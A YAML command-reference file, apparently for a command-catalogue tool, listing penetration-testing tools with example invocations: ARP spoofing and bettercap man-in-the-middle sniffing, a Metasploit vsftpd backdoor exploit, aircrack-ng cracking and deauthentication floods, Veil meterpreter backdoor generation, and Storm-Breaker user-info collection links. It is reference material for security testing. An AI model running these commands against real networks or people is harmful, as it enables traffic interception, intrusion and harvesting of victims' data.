name: pentest
help: Pentest commands (Documentation only)
group: Pentest
expose: always

commands:
  - name: maltego
    help: A social engineering strategy planning and reconnaissance tool
    dependencies:
      maltego: See 'https://www.maltego.com/downloads/'

  - name: ifconfig
    help: View and modify interfaces (Debian-based OSes only)
    filters:
      - debian_based_os
    examples:
      - |-
        # Change local MAC
        ifconfig wlan0 down && ifconfig wlan0 hw ether 00:11:22:33:44:55
      - |-
        # Set wlan0 to monitor mode
        ifconfig wlan0 down && ifconfig wlan0 mode monitor

  - name: netdiscover
    help: Scan the network for devices (Debian-based OSes only)
    filters:
      - debian_based_os
    dependencies:
      netdiscover: Install with 'sudo apt install netdiscover'
    examples:
      - netdiscover -i eth0 -r 10.0.2.0/24 -c 10

  - name: nmap
    help: Map the network
    dependencies:
      nmap: See 'https://nmap.org/download'
    examples:
      - nmap 10.0.2.0/24
      - |-
        # Scan target host for open ports
        # and services
        nmap -v -sS -A -T4 10.0.2.15

  - name: arpspoof
    help: Perform arp poisoning (Debian-based OSes only)
    dependencies:
      arpspoof: Install with 'sudo apt install dsniff'
    filters:
      - debian_based_os
    examples:
      - |-
        # Tell the target that we are the router
        arpspoof -i eth0 -t 10.0.2.6 10.0.2.1
      - |-
        # Tell the router that we are the target
        arpspoof -i eth0 -t 10.0.2.1 10.0.2.6

  - name: bettercap
    help: Analyze network data
    dependencies:
      bettercap: See 'https://www.bettercap.org/project/installation/'
    examples: |-
      # MITM attack
      sudo bettercap wlp2s0
      set arp.spoof.fullduplex true
      set arp.spoof.internal true
      set arp.spoof.targets 10.0.2.6
      arp.spoof on
      net.sniff on # Sniff packets

  - name: msfconsole
    help: Metasploit Framework for executing known exploits against targets
    dependencies:
      msfconsole: See 'https://www.metasploit.com/download'
    examples: |-
      # Exploit FTP 2.3.4 backdoor
      msfconsole
      use exploit/unix/ftp/vsftpd_234_backdoor
      show options
      set rhosts 192.168.0.105
      show targets
      set target 0
      exploit -j -z
      sessions -l
      sessions 1
      background

  - name: aircrack-ng
    help: Wireless network password cracking
    dependencies:
      aircrack-ng: See 'https://www.aircrack-ng.org/doku.php?id=install_aircrack'
    examples: |-
      airmon-ng start wlan0 # Set wlan0 to monitor mode
      airodump-ng wlan0 # Gather data to find target
      airodump-ng --channel 12 --bssid 00:11:22:33:44:55 --write airodump_dump mon0 # Gather data for specific target network

      # WPA
      aircrack-ng airodump_dump.cap -w wordlist.txt

      # WEP
      aircrack-ng airodump_dump.cap
      aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h 22:44:66:88:00:BB # Not enough IV's? Fake authentication with network
      aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h 22:44:66:88:00:BB # Then replay ARPs to gather more IV's

      # DOS
      aireplay-ng --deauth 10000 -a 00:11:22:33:44:55 mon0 # Force network-wide deauth to trigger a handshake you can capture
      aireplay-ng --deauth 1000 -a 00:11:22:33:44:55 -c 22:44:66:88:00:11 mon0 # Force a deauth against a specific client on network to capture handshake

  - name: crunch
    help: Generate brute-force passwords wordlist with some constraints. Useful if you have some idea of what the password is already.
    dependencies:
      crunch: See 'https://ciphrexlabs.com/tcontent/crunch-the-all-in-one-wordlist-generator'
    examples:
      - crunch 6 6 0123456789abcdef -o wordlist.txt

  - name: veil
    help: Generate backdoor binaries using known exploits
    examples: |-
      # Create a meterpreter TCP backdoor
      cd /opt/Veil && python3 Veil.py
      use 1
      list
      use 7
      set LHOST 10.0.2.4
      generate

  - name: ngrok
    help: Free public load balancing to direct traffic to your local system
    dependencies:
      ngrok: See 'https://ngrok.com/download'
    examples:
      - |-
        # Start an ngrok LB pointing to localhost:2525
        ngrok http 2525

  - name: storm-breaker
    help: Generates links to a locally hosted website to collect user info
    dependencies:
      stormbreaker: See 'https://github.com/ultrasecurity/Storm-Breaker'
    examples:
      - cd /opt/Storm-Breaker && sudo python3 st.py
